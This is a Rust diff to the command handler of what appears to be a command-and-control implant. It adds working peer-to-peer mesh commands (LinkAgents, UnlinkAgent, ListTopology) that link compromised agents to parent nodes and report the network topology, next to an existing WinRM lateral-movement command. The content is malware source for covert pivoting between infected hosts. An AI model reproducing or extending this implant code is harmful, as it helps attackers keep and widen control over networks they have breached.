@@ -650,9 +650,37 @@ pub async fn handle_command(
         Command::WinRmExec { .. } => Err("lateral movement requires Windows".to_string()),
 
         // ── P2P mesh management ────────────────────────────────────────
-        Command::LinkAgents { .. } => Err("P2P LinkAgents not yet implemented on agent".to_string()),
-        Command::UnlinkAgent { .. } => Err("P2P UnlinkAgent not yet implemented on agent".to_string()),
-        Command::ListTopology => Err("P2P ListTopology not yet implemented on agent".to_string()),
+        Command::LinkAgents { ref target_addr, ref transport, .. } => {
+            let mesh_arc = p2p_mesh.clone();
+            let mut mesh_guard = mesh_arc.lock().await;
+            match mesh_guard.connect_to_parent(
+                target_addr,
+                transport,
+                out_tx.clone(),
+                p2p_mesh.clone(),
+            ).await {
+                Ok(link_id) => Ok(format!(
+                    "LinkAgents: linked to {} via {}, link_id={:#010X}",
+                    target_addr, transport, link_id
+                )),
+                Err(e) => Err(format!("LinkAgents failed: {e}")),
+            }
+        }
+        Command::UnlinkAgent { ref agent_id } => {
+            let mesh_arc = p2p_mesh.clone();
+            let mut mesh_guard = mesh_arc.lock().await;
+            match mesh_guard.disconnect_peer(agent_id).await {
+                Ok(_) => Ok(format!("Peer '{agent_id}' unlinked")),
+                Err(e) => Err(format!("UnlinkAgent failed: {e}")),
+            }
+        }
+        Command::ListTopology => {
+            let mesh_arc = p2p_mesh.clone();
+            let mesh_guard = mesh_arc.lock().await;
+            let topology = mesh_guard.get_topology();
+            serde_json::to_string(&topology)
+                .map_err(|e| format!("ListTopology serialization failed: {e}"))
+        }
 
         // ── Agent-side P2P link commands ───────────────────────────────
         Command::LinkTo { ref parent_addr, ref transport } => {
